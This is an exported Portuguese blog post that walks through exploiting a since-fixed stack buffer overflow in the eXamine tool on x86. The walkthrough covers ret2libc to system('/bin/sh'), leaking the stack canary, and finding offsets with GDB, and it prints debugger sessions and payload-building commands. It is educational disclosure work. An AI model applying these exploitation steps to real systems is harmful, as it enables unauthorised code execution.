<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>Bypassando NX e Canary em x86</title><meta name="description" content="Ou “pwning for dummies”"><style>
      * {
        font-family: Georgia, Cambria, "Times New Roman", Times, serif;
      }
      html, body {
        margin: 0;
        padding: 0;
      }
      h1 {
        font-size: 50px;
        margin-bottom: 17px;
        color: #333;
      }
      h2 {
        font-size: 24px;
        line-height: 1.6;
        margin: 30px 0 0 0;
        margin-bottom: 18px;
        margin-top: 33px;
        color: #333;
      }
      h3 {
        font-size: 30px;
        margin: 10px 0 20px 0;
        color: #333;
      }
      header {
        width: 640px;
        margin: auto;
      }
      section {
        width: 640px;
        margin: auto;
      }
      section p {
        margin-bottom: 27px;
        font-size: 20px;
        line-height: 1.6;
        color: #333;
      }
      section img {
        max-width: 640px;
      }
      footer {
        padding: 0 20px;
        margin: 50px 0;
        text-align: center;
        font-size: 12px;
      }
      .aspectRatioPlaceholder {
        max-width: auto !important;
        max-height: auto !important;
      }
      .aspectRatioPlaceholder-fill {
        padding-bottom: 0 !important;
      }
      header,
      section[data-field=subtitle] {
        display: none;
      }
      </style></head><body><article class="h-entry">
<header>
<h1 class="p-name">Bypassando NX e Canary em x86</h1>
</header>
<section data-field="subtitle" class="p-summary">
Ou “pwning for dummies”
</section>
<section data-field="body" class="e-content">
<section name="1c45" class="section section--body section--first"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h3 name="5b89" id="5b89" class="graf graf--h3 graf--leading graf--title">Bypassando NX e Canary em x86</h3><h4 name="70f6" id="70f6" class="graf graf--h4 graf-after--h3 graf--subtitle">Ou “pwning for dummies”</h4><p name="6faf" id="6faf" class="graf graf--p graf--hasDropCapModel graf--hasDropCap graf-after--h4"><span class="graf-dropCap">M</span>ês passado o <a href="https://medium.com/u/ab160d5eb7a4" data-href="https://medium.com/u/ab160d5eb7a4" data-anchor-type="2" data-user-id="ab160d5eb7a4" data-action-value="ab160d5eb7a4" data-action="show-user-card" data-action-type="hover" class="markup--user markup--p-user" target="_blank">Fernando Mercês</a> pediu pelo <a href="https://twitter.com/MercesFernando/status/979170684881555457" data-href="https://twitter.com/MercesFernando/status/979170684881555457" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">Twitter</a> que reportássemos bugs em uma ferramenta dele. Como estava estudando <em class="markup--em markup--p-em">pwning,</em> imaginei que procurar por vulnerabilidades nos repositórios dele seria um bom desafio. <em class="markup--em markup--p-em">( </em>̶<em class="markup--em markup--p-em">s̶o̶r̶r̶y̶ ̶m̶e̶r̶c̶ê̶s̶ )</em></p><p name="f5ad" id="f5ad" class="graf graf--p graf-after--p">Encontrei um <a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow" data-href="https://en.wikipedia.org/wiki/Stack_buffer_overflow" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">Stack Buffer Overflow</a> na tool <a href="https://github.com/merces/examine" data-href="https://github.com/merces/examine" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank"><strong class="markup--strong markup--p-strong">eXamine</strong></a> e escrevi um <em class="markup--em markup--p-em">exploit</em> <em class="markup--em markup--p-em">bypassando</em> várias proteções “modernas” como o NX e o Canary.<br>Esse texto é um <em class="markup--em markup--p-em">write up </em>bem introdutório sobre essas proteções e como foi o processo de escrever o <em class="markup--em markup--p-em">exploit </em>com o <a href="https://github.com/Gallopsled/pwntools" data-href="https://github.com/Gallopsled/pwntools" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank"><em class="markup--em markup--p-em">pwntools</em></a><em class="markup--em markup--p-em"> </em>para a arquitetura x86, depois soltarei outro texto para x64, também assumo que o leitor já tenha algum conhecimento sobre <em class="markup--em markup--p-em">buffer overflows</em>, <em class="markup--em markup--p-em">Assembly</em> e etc.</p><p name="08db" id="08db" class="graf graf--p graf-after--p">A vulnerabilidade foi consertada em tempo recorde de 2 dias.<br><em class="markup--em markup--p-em">Se você for </em>um <strong class="markup--strong markup--p-strong"><em class="markup--em markup--p-em">l33t0 </em></strong><em class="markup--em markup--p-em">apressado, o exploit tá lá embaixo.</em></p><h3 name="7132" id="7132" class="graf graf--h3 graf-after--p">Stack Buffer Overflow</h3><figure name="53d9" id="53d9" class="graf graf--figure graf--iframe graf--layoutOutsetLeft graf-after--h3"><script src="https://gist.github.com/caioluders/5ee3637ef7d14387e77b3d50e6e168ff.js"></script><figcaption class="imageCaption">Reprodução da função main do código vulnerável</figcaption></figure><p name="61d9" id="61d9" class="graf graf--p graf-after--figure">Note a linha 18, ela escreve um <em class="markup--em markup--p-em">char</em> na array “<em class="markup--em markup--p-em">s”</em> mas nunca checa se o “<em class="markup--em markup--p-em">i”</em> é maior do que o tamanho da <em class="markup--em markup--p-em">array</em>. Assim, podemos escrever o quanto quisermos na <em class="markup--em markup--p-em">stack.</em> Agora fica fácil de redirecionar a execução do programa para onde quisermos, é só colocar um <em class="markup--em markup--p-em">shellcode </em>na <em class="markup--em markup--p-em">stack</em> e executa-lo, certo ?</p><p name="b739" id="b739" class="graf graf--p graf-after--p">Errado ( ̶o̶t̶á̶r̶i̶o̶!̶), o problema é que essa vulnerabilidade já tem mais de <a href="https://en.wikipedia.org/wiki/Buffer_overflow#History" data-href="https://en.wikipedia.org/wiki/Buffer_overflow#History" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">40 anos</a>, e com o tempo os sistemas operacionais foram implementando várias proteções que dificultam enormemente a exploração.</p><p name="8619" id="8619" class="graf graf--p graf-after--p">Utilizando o <a href="https://github.com/RobinDavid/checksec/blob/master/checksec.sh" data-href="https://github.com/RobinDavid/checksec/blob/master/checksec.sh" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank"><em class="markup--em markup--p-em">checksec</em></a> conseguimos verificar todas as proteções no nosso binário: <a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries" data-href="https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">Canary</a>; <a href="https://tk-blog.blogspot.com.br/2009/02/relro-not-so-well-known-memory.html" data-href="https://tk-blog.blogspot.com.br/2009/02/relro-not-so-well-known-memory.html" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">RELRO</a> e <a href="https://en.wikipedia.org/wiki/NX_bit" data-href="https://en.wikipedia.org/wiki/NX_bit" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">NX</a> — Eu desabilitei o <a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization" data-href="https://en.wikipedia.org/wiki/Address_space_layout_randomization" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">ASLR</a> da minha máquina, porque ̶s̶o̶u̶ ̶n̶0̶0̶b̶ ativado faria com que as alocações de memória fossem aleatórias, tentarei fazer um <em class="markup--em markup--p-em">exploit</em> para <em class="markup--em markup--p-em">bypassar</em> ele também no futuro.</p><pre name="179a" id="179a" class="graf graf--pre graf-after--p graf--trailing">$ checksec examine32<br>[*] ‘/home/vagrant/host/CTF/mentebinaria/examine/examine32’<br> Arch: i386–32-little<br> RELRO: Partial RELRO<br> Stack: Canary found<br> NX: NX enabled<br> PIE: No PIE (0x8048000)<br> FORTIFY: Enabled</pre></div></div></section><section name="5748" class="section section--body"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h3 name="6b57" id="6b57" class="graf graf--h3 graf--leading">No-eXecute</h3><p name="e43e" id="e43e" class="graf graf--p graf-after--h3">Também conhecido como NX, essa proteção determina quais áreas da memória poderão ser executadas. Impedindo assim, que o atacante coloque seu <em class="markup--em markup--p-em">payload</em> malicioso na <em class="markup--em markup--p-em">Stack</em> e o execute com alguma vulnerabilidade. Existem inúmeras maneiras de evitar essa proteção, neste <em class="markup--em markup--p-em">exploit </em>eu usei o <em class="markup--em markup--p-em">ret2libc — </em>recomendo a leitura do primeiro <a href="http://seclists.org/bugtraq/1997/Aug/63" data-href="http://seclists.org/bugtraq/1997/Aug/63" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">artigo sobre o assunto</a>.</p><p name="1a2c" id="1a2c" class="graf graf--p graf-after--p">A idéia principal do <em class="markup--em markup--p-em">ret2libc </em>é que ao invés de redirecionarmos a execução do programa para o nosso payload na <em class="markup--em markup--p-em">stack,</em> vamos executar algo da <a href="https://en.wikipedia.org/wiki/C_standard_library" data-href="https://en.wikipedia.org/wiki/C_standard_library" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">libc</a> como um <em class="markup--em markup--p-em">system(“/bin/sh”)</em> por exemplo. Para fazermos isso precisamos passar argumentos para a função. No x86 os argumentos ficam na <em class="markup--em markup--p-em">stack</em>, então temos que prepará-la de acordo com o que quisermos fazer. No caso nossa stack terá que se parecer com essa :</p><figure name="2127" id="2127" class="graf graf--figure graf-after--p"><div class="aspectRatioPlaceholder is-locked" style="max-width: 180px; max-height: 335px;"><div class="aspectRatioPlaceholder-fill" style="padding-bottom: 186.1%;"></div><img class="graf-image" data-image-id="1*LjEI-MYRVHuZ8UHdYKsVFQ.png" data-width="180" data-height="335" src="https://cdn-images-1.medium.com/max/800/1*LjEI-MYRVHuZ8UHdYKsVFQ.png"></div></figure><p name="110c" id="110c" class="graf graf--p graf-after--figure">Então temos que descobrir os endereços. Para fazer isso podemos utilizar o <a href="https://en.wikipedia.org/wiki/GNU_Debugger" data-href="https://en.wikipedia.org/wiki/GNU_Debugger" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">GDB</a> com o <a href="https://github.com/longld/peda" data-href="https://github.com/longld/peda" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank"><strong class="markup--strong markup--p-strong">peda</strong></a>. Descobrindo os endereços de <em class="markup--em markup--p-em">exit</em> e de <em class="markup--em markup--p-em">system </em>na<em class="markup--em markup--p-em"> libc</em>:</p><pre name="3409" id="3409" class="graf graf--pre graf-after--p">gdb-peda$ p system<br>$1 = {&lt;text variable, no debug info&gt;} 0xf7e19e70 &lt;system&gt;<br>gdb-peda$ p exit<br>$2 = {&lt;text variable, no debug info&gt;} 0xf7e0cf50 &lt;exit&gt;</pre><p name="afc4" id="afc4" class="graf graf--p graf-after--pre">Também precisamos encontrar o endereço da string “/bin/sh” :</p><pre name="7de6" id="7de6" class="graf graf--pre graf-after--p">gdb-peda$ find “/bin/sh”<br>Searching for ‘/bin/sh’ in: None ranges<br>Found 1 results, display max 1 items:<br>libc : 0xf7f39fcc (“/bin/sh”)</pre><p name="f21c" id="f21c" class="graf graf--p graf-after--pre">Importante notar que é necessário saber qual a versão do <em class="markup--em markup--p-em">libc</em> na máquina alvo para encontrar as funções desejadas (<em class="markup--em markup--p-em">system</em> por exemplo), calculando os <em class="markup--em markup--p-em">offsets</em> através do endereço base de memória alocada para <em class="markup--em markup--p-em">libc</em>. Pois os <em class="markup--em markup--p-em">offsets</em> se diferenciam entre as versões. Aqui tem uma database de versões para ajudar a encontrar : <a href="https://github.com/niklasb/libc-database" data-href="https://github.com/niklasb/libc-database" class="markup--anchor markup--p-anchor" rel="nofollow noopener noopener noopener" target="_blank">github.com/niklasb/libc-database</a> — Discutirei isso mais a fundo no próximo post.</p><figure name="3956" id="3956" class="graf graf--figure graf--iframe graf--layoutOutsetLeft graf-after--p"><script src="https://gist.github.com/caioluders/cd2a2abf738cb457f80023dd1456c70e.js"></script></figure><p name="311f" id="311f" class="graf graf--p graf-after--figure">Vamos começar o esboço do nosso <em class="markup--em markup--p-em">exploit</em>.<br>Abrimos o processo, declaramos os endereços, montamos o <em class="markup--em markup--p-em">payload</em> e adicionamos o <em class="markup--em markup--p-em">0xff</em> para servir de EOF — Vide linha 9 do código, precisamos do EOF para atingirmos o <em class="markup--em markup--p-em">return.</em></p><p name="2ed5" id="2ed5" class="graf graf--p graf-after--p">Mas ainda não sabemos o <em class="markup--em markup--p-em">offset, </em>vamos descobri-lo usando o GDB :<br><em class="markup--em markup--p-em">Leia os # , são meus comentários.</em></p><pre name="7419" id="7419" class="graf graf--pre graf-after--p">$ gdb ./examine32<br>[... cortado]<br>gdb-peda$ pattern_create 2000 pat <br>Writing pattern of 2000 chars to filename “pat”<br># Primeiro criamos um arquivo &quot;pat&quot; de tamanho 2000 com um pattern para podermos identificar exatamente o offset<br>gdb-peda$ r &lt; pat # rodando o programa com o arquivo pat<br>Starting program: /home/vagrant/host/CTF/mentebinaria/examine/examine32 &lt; pat</pre><pre name="463b" id="463b" class="graf graf--pre graf-after--pre">Program received signal SIGSEGV, Segmentation fault.<br># Recebemos um SIGSEGV, vamos analizar por que.<br>[... cortado]<br>[ — — — — — — — — — — — — — — — — — — -code — — — — — — — — — — — -]<br> 0xf7e0c5cb &lt;getenv+107&gt;: mov esi,DWORD PTR [ebp+0x0]<br> 0xf7e0c5ce &lt;getenv+110&gt;: test esi,esi<br> 0xf7e0c5d0 &lt;getenv+112&gt;: je 0xf7e0c62a &lt;getenv+202&gt;<br>=&gt; 0xf7e0c5d2 &lt;getenv+114&gt;: cmp di,WORD PTR [esi]  # por algum motivo o binário foi parar em getenv e bugou pois o valor de ESI foi sobrescrito<br>[... cortado]<br><br>gdb-peda$ bt # vamos checar com o backtrace porque o binário foi parar em getenv<br>#0 0xf7e0c5d2 in getenv () from /lib32/libc.so.6<br>#1 0xf7e4230b in ?? () from /lib32/libc.so.6<br>#2 0xf7ed5c9b in __fortify_fail () from /lib32/libc.so.6<br>#3 0xf7ed5c2a in __stack_chk_fail () from /lib32/libc.so.6 # Opa ,o que é isso ? <br>#4 0x08048767 in main ()</pre><p name="55c3" id="55c3" class="graf graf--p graf-after--pre">Recebemos um SIGSEGV pois o binário chamou <em class="markup--em markup--p-em">__stack_chk_fail</em>, vamos fazer uma breve análise no <a href="https://www.hex-rays.com/products/ida/" data-href="https://www.hex-rays.com/products/ida/" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">IDA</a> para entendermos porque ele foi parar lá.</p></div><div class="section-inner sectionLayout--outsetColumn"><figure name="af2b" id="af2b" class="graf graf--figure graf--layoutOutsetCenter graf-after--p"><div class="aspectRatioPlaceholder is-locked" style="max-width: 1000px; max-height: 750px;"><div class="aspectRatioPlaceholder-fill" style="padding-bottom: 75%;"></div><img class="graf-image" data-image-id="1*MjbYO0SYl6xdmCi1XvaY1w.jpeg" data-width="1024" data-height="768" src="https://cdn-images-1.medium.com/max/1000/1*MjbYO0SYl6xdmCi1XvaY1w.jpeg"></div></figure></div><div class="section-inner sectionLayout--insetColumn"><p name="30b2" id="30b2" class="graf graf--p graf-after--figure graf--trailing">Na <strong class="markup--strong markup--p-strong">seta</strong> <strong class="markup--strong markup--p-strong">1 </strong>ele compara o nosso <em class="markup--em markup--p-em">input </em>com <em class="markup--em markup--p-em">0xff </em>, isso corresponde a linha 9 do <em class="markup--em markup--p-em">main</em>, onde ele compara com EOF e que resulta no <em class="markup--em markup--p-em">return</em>. Mas antes de ir para o <em class="markup--em markup--p-em">return</em> ele vai para <strong class="markup--strong markup--p-strong">seta 2</strong> onde ele compara um valor da <em class="markup--em markup--p-em">stack</em> <em class="markup--em markup--p-em">“$esp+3FCh”</em> com outro um valor <em class="markup--em markup--p-em">“$gs:14h”</em> e checa se são iguais, caso não forem ele chama a função <em class="markup--em markup--p-em">__stack_chk_fail, </em>que causou o erro.</p></div></div></section><section name="fe93" class="section section--body"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h3 name="1ca7" id="1ca7" class="graf graf--h3 graf--leading">Canary</h3><p name="4902" id="4902" class="graf graf--p graf-after--h3">Isto é chamado de Canary, ou <em class="markup--em markup--p-em">stack cookie</em>, um valor randômico que o programa conhece que é colocado na <em class="markup--em markup--p-em">stack</em> e antes de fazer um <em class="markup--em markup--p-em">return</em> é checado se ele foi alterado. Nosso problema é que para fazermos o <em class="markup--em markup--p-em">ret2libc,</em> ou qualquer outra técnica de <em class="markup--em markup--p-em">buffer overflow, </em>vamos acabar sobrescrevendo o Canary. Então para <em class="markup--em markup--p-em">bypassa-lo </em>precisamos conhecer o seu valor.</p><p name="eda9" id="eda9" class="graf graf--p graf-after--p">Mas antes de tentarmos descobrir o valor, precisamos ainda descobrir o <em class="markup--em markup--p-em">offset</em> correto. Para isso, voltemos ao GDB. Vamos basicamente ignorar a checagem do <em class="markup--em markup--p-em">Canary</em> e ver o que acontece.<br><em class="markup--em markup--p-em">Leia os # , são meus comentários.</em></p><pre name="b349" id="b349" class="graf graf--pre graf-after--p">$ gdb ./examine32<br>gdb-peda$ disas main<br># Vamos encontrar onde ele faz a checagem que vimos no IDA<br>Dump of assembler code for function main:<br> [... cortado]<br> 0x08048748 &lt;+152&gt;: xor eax,eax # É aqui onde começa o a checagem do Canary<br> 0x0804874a &lt;+154&gt;: mov esi,DWORD PTR [esp+0x3fc]<br> 0x08048751 &lt;+161&gt;: xor esi,DWORD PTR gs:0x14<br> 0x08048758 &lt;+168&gt;: jne 0x8048762 &lt;main+178&gt;<br> 0x0804875a &lt;+170&gt;: lea esp,[ebp-0xc]<br> 0x0804875d &lt;+173&gt;: pop ebx<br> 0x0804875e &lt;+174&gt;: pop esi<br> 0x0804875f &lt;+175&gt;: pop edi<br> 0x08048760 &lt;+176&gt;: pop ebp<br> 0x08048761 &lt;+177&gt;: ret<br> 0x08048762 &lt;+178&gt;: call 0x80485e0 &lt;__stack_chk_fail@plt&gt;<br>End of assembler dump.<br>gdb-peda$ b * main+161 # colocando um breakpoint para logo antes do jne<br>Breakpoint 1 at 0x8048751<br>gdb-peda$ r &lt; pat # executando o programa</pre><pre name="c33d" id="c33d" class="graf graf--pre graf-after--pre">[... cortado]<br>[ — — — — — — — — — — — — — -code — — — — — — — — — — — — — — — — -]<br> 0x8048741 &lt;main+145&gt;: lea esi,[esi+eiz*1+0x0]<br> 0x8048748 &lt;main+152&gt;: xor eax,eax<br> 0x804874a &lt;main+154&gt;: mov esi,DWORD PTR [esp+0x3fc]<br>=&gt; 0x8048751 &lt;main+161&gt;: xor esi,DWORD PTR gs:0x14<br> 0x8048758 &lt;main+168&gt;: jne 0x8048762 &lt;main+178&gt;<br> 0x804875a &lt;main+170&gt;: lea esp,[ebp-0xc]<br> 0x804875d &lt;main+173&gt;: pop ebx<br> 0x804875e &lt;main+174&gt;: pop esi<br>[ — — — — — — — — — — —— — — stack — — — — — — — — — — — — — — — -]<br>[... cortado]<br>Breakpoint 1, 0x08048751 in main () # atingimos o breakpoint<br>gdb-peda$ s # indo para o jne<br>[... cortado]<br>[ — — — — — — — — — — — — — — — — -code — — — — —— — — — — — — — -]<br> 0x8048748 &lt;main+152&gt;: xor eax,eax<br> 0x804874a &lt;main+154&gt;: mov esi,DWORD PTR [esp+0x3fc]<br> 0x8048751 &lt;main+161&gt;: xor esi,DWORD PTR gs:0x14<br>=&gt; 0x8048758 &lt;main+168&gt;: jne 0x8048762 &lt;main+178&gt;<br> | 0x804875a &lt;main+170&gt;: lea esp,[ebp-0xc]<br> | 0x804875d &lt;main+173&gt;: pop ebx<br> | 0x804875e &lt;main+174&gt;: pop esi<br> | 0x804875f &lt;main+175&gt;: pop edi<br> |-&gt; 0x8048762 &lt;main+178&gt;: call 0x80485e0 &lt;__stack_chk_fail@plt&gt;<br> 0x8048767 &lt;_start&gt;: xor ebp,ebp<br> 0x8048769 &lt;_start+2&gt;: pop esi<br> 0x804876a &lt;_start+3&gt;: mov ecx,esp<br> JUMP is taken<br>[... cortado]<br>0x08048758 in main ()<br>gdb-peda$ j * main+170 # dando um jump para 0x804875a, ignorando o jne<br>Continuing at 0x804875a.</pre><pre name="7319" id="7319" class="graf graf--pre graf-after--pre graf--trailing">Program received signal SIGSEGV, Segmentation fault.<br>[ — — — — — — — —— — — — — registers — — — — — — — — — — — — — — -]<br>EAX: 0x0<br>EBX: 0x6e41246e (‘n$An’)<br>ECX: 0xf7f858a4 → 0x0<br>EDX: 0xffffffff<br>ESI: 0x436e416e (‘nAnC’)<br>EDI: 0x412d6e41 (‘An-A’)<br>EBP: 0x6e41286e (‘n(An’)<br>ESP: 0xffffd650 (“An)AnEAnaAn0AnFAnbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(ACDAC”…)<br>EIP: 0x3b6e4144 (‘DAn;’) # EIP sobrescrito<br>EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)<br>[ — — — — — — — — — — — — — -code — — — — — — — — — — — — — — — -]<br>Invalid $PC address: 0x3b6e4144<br>[... cortado]<br>Stopped reason: SIGSEGV<br>0x3b6e4144 in ?? ()<br>gdb-peda$ pattern_offset “DAn;” # procurando o offset de “DAn;” <br>DAn; found at offset: 1032 # achamos o offset</pre></div></div></section><section name="f45c" class="section section--body section--last"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h4 name="d4fc" id="d4fc" class="graf graf--h4 graf--leading">Lendo o Canary</h4><p name="fb35" id="fb35" class="graf graf--p graf-after--h4">Precisamos de alguma forma ler o conteúdo do Canary para coloca-lo certo na stack. <br>Depois de receber um <em class="markup--em markup--p-em">input</em> o programa executa o código abaixo, que transforma a array para URL Encoding.</p><pre name="8daa" id="8daa" class="graf graf--pre graf-after--p">for (i=0; i &lt; strlen(s); i++)<br>   printf(&quot;%%%2X&quot;, s[i]);</pre><figure name="514d" id="514d" class="graf graf--figure graf--layoutOutsetLeft graf-after--pre"><div class="aspectRatioPlaceholder is-locked" style="max-width: 170px; max-height: 155px;"><div class="aspectRatioPlaceholder-fill" style="padding-bottom: 91.2%;"></div><img class="graf-image" data-image-id="1*ApAL8LqAtt-k-oIK8DiK-A.png" data-width="170" data-height="155" src="https://cdn-images-1.medium.com/max/600/1*ApAL8LqAtt-k-oIK8DiK-A.png"></div></figure><p name="3e2f" id="3e2f" class="graf graf--p graf-after--figure">Essa é a <em class="markup--em markup--p-em">stack</em> normal do programa, com o Canary logo depois da <em class="markup--em markup--p-em">array</em> que estamos sobrescrevendo. Note os bytes nulos no final dos dois.</p><p name="80a9" id="80a9" class="graf graf--p graf-after--p">Uma <em class="markup--em markup--p-em">string</em>, sendo uma <em class="markup--em markup--p-em">array </em>de <em class="markup--em markup--p-em">chars</em>, tem seu término delimitado pelo byte nulo. Se sobrescrevermos apenas o <em class="markup--em markup--p-em">nullbyte</em> da string “<em class="markup--em markup--p-em">s” </em>o <em class="markup--em markup--p-em">strlen</em> continuará contando até encontrar o outro <em class="markup--em markup--p-em">nullbyte</em> do Canary, assim, conseguiremos <em class="markup--em markup--p-em">printar</em> o valor do Canary.<br>Segue :</p><pre name="f423" id="f423" class="graf graf--pre graf-after--p">$ python -c “print ‘A’*1001” &gt; aaa # 1001 é o tamanho da array<br>$ ./examine32 &lt; aaa<br>[... cortado]<br>URL encoding: %41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%FFFFFF9C%FFFFFFCF%FFFFFFD3%FFFFFFC4%43%FFFFFFF8%FFFFFFF7</pre><p name="74e9" id="74e9" class="graf graf--p graf-after--pre">Conseguimos assim ler os valores do Canary, depois temos apenas que montar a stack com o valor dele para não cairmos no <em class="markup--em markup--p-em">__stack_chk_fail.</em></p><p name="7591" id="7591" class="graf graf--p graf-after--p">E o exploit final :</p><figure name="b8be" id="b8be" class="graf graf--figure graf--iframe graf-after--p"><script src="https://gist.github.com/caioluders/8402fa2d620b0c92c9bb5bf22870d690.js"></script></figure><p name="e89b" id="e89b" class="graf graf--p graf-after--figure">Como em x64 os argumentos ficam nos registradores, precisaremos fazer mais coisa antes de chamar o <em class="markup--em markup--p-em">system, </em>esse será o tópico do próximo post.</p><p name="9954" id="9954" class="graf graf--p graf-after--p graf--trailing">Inté !</p></div></div></section>
</section>
<footer><p class="p-tags">Tagged in <a href="https://medium.com/tag/exploitation" class="p-tag">Exploitation</a>, <a href="https://medium.com/tag/ret2libc" class="p-tag">Ret2libc</a>, <a href="https://medium.com/tag/hacking" class="p-tag">Hacking</a></p><p>By <a href="https://medium.com/@caioluders" class="p-author h-card">Caio Lüders</a> on <a href="https://medium.com/p/b8d8855f1352"><time class="dt-published" datetime="2018-04-13T01:07:53.589Z">April 13, 2018</time></a>.</p><p><a href="https://medium.com/@caioluders/bypassando-nx-e-canary-em-x86-b8d8855f1352" class="p-canonical">Canonical link</a></p><p>Exported from <a href="https://medium.com">Medium</a> on April 24, 2018.</p></footer></article>

</body></html>